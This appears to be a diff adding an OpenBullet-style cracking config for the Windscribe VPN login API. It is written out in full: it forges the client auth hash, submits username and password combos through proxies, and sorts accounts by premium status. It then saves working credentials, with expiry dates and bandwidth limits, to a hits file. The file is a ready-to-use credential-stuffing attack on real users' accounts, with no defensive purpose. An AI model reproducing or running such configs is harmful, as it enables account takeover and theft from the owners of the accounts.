@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "Windscribe 1.0@DXDDEVIL",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-05T09:00:21.3621215+05:30",
+  "AdditionalInfo": "Join @ConfigbyDXD",
+  "Author": "@DXDDEVIL",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "U1" 
+
+FUNCTION Round "<U1>" -> VAR "U2" 
+
+FUNCTION Hash MD5 "952b4412f002315aa50751032fcaab03<U2>" -> VAR "Hash" 
+
+#LOGIN REQUEST POST "https://api.staticnetcontent.com/Session?platform=android&password=<PASS>&client_auth_hash=<Hash>&time=<U2>&username=<USER>&session_type_id=4" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: okhttp/4.1.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Length: 0" 
+  HEADER "Host: api.staticnetcontent.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not log in with provided credentials" 
+    KEY "errorCode\": 502" 
+    KEY "errorCode\": 500" 
+    KEY "errorCode\": 706" 
+  KEYCHAIN Success OR 
+    KEY "is_premium\": 1" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "premium\": 0," 
+
+#Email PARSE "<SOURCE>" LR "\"email\": \"" "\"," -> CAP "Email" 
+
+#Expriy PARSE "<SOURCE>" LR "expiry_date\": \"" "\"," -> CAP "Expiry Date" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry Date>" -> VAR "Trd" 
+
+FUNCTION Compute "<Trd> - <U1>" -> VAR "TRD1" 
+
+FUNCTION Compute "<TRD1> / 86400" -> VAR "RD" 
+
+FUNCTION Round "<RD>" -> CAP "Remaining Days" 
+
+#Limit PARSE "<SOURCE>" LR "\"traffic_max\": " "," -> VAR "Bandwidth LIMIT" 
+
+FUNCTION Replace "-1" "Unlimited" "<Bandwidth LIMIT>" -> CAP "Max LIMIT" 
+
+FUNCTION Constant "@DXDDEVIL" -> CAP "By" 
+
+UTILITY File "WindscribePremium.txt" AppendLines "\\n************** WindscribePremium ******************\\n\\n---------------------------------------\\n\\nEmail:Pass :- <USER>:<PASS>\\n\\nEmail = <Email>\\n\\nExpiry = <Expiry Date>\\n\\nMax LIMIT  = <Max LIMIT>\\n\\nRemaining Days = <Remaining Days>\\n\\nConfig Made By @DXDDEVIL\\n\\n-------------------------------\\n\\n" -> VAR "HIts" 
+
